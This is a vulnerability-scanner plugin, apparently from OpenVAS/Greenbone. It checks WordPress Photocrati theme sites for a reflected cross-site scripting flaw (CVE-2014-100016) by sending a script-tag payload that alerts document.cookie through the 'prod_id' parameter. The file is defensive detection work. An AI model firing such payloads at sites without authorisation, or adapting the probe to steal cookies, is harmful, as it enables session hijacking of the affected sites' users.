CPE = "cpe:/a:photocrati:photocrati-theme";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802089" );
	script_version( "2020-09-04T13:44:38+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-09-04 13:44:38 +0000 (Fri, 04 Sep 2020)" );
	script_tag( name: "creation_date", value: "2015-01-22 12:44:09 +0530 (Thu, 22 Jan 2015)" );
	script_cve_id( "CVE-2014-100016" );
	script_bugtraq_id( 65238 );
	script_name( "WordPress Photocrati Theme 'prod_id' Cross-Site Scripting Vulnerability" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wordpress_theme_http_detect.sc" );
	script_mandatory_keys( "wordpress/theme/photocrati-theme/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "The WordPress theme Photocrati is prone to a cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Checks if a vulnerable version is installed on the target host." );
	script_tag( name: "insight", value: "The flaw exists as input passed via the
  'prod_id' GET parameter to the '/photocrati-theme/photocrati-gallery/ecomm-sizes.php'
  file is not properly sanitised before being returned to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to execute arbitrary HTML and script code in a user's browser session
  in context of an affected site." );
	script_tag( name: "affected", value: "WordPress Photocrati theme version
  4.7.3. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available
  for at least one year since the disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/56690" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/90812" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/124986" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/photocrati-gallery/ecomm-sizes.php";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(res && IsMatchRegexp( res, "^HTTP/1\\.[01] 200" )){
	url = dir + "/photocrati-gallery/ecomm-sizes.php?prod_id=\"/><script>alert(document.cookie);</script>";
	if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document.cookie\\);</script>", extra_check: ">Add To Shopping Cart<" )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}

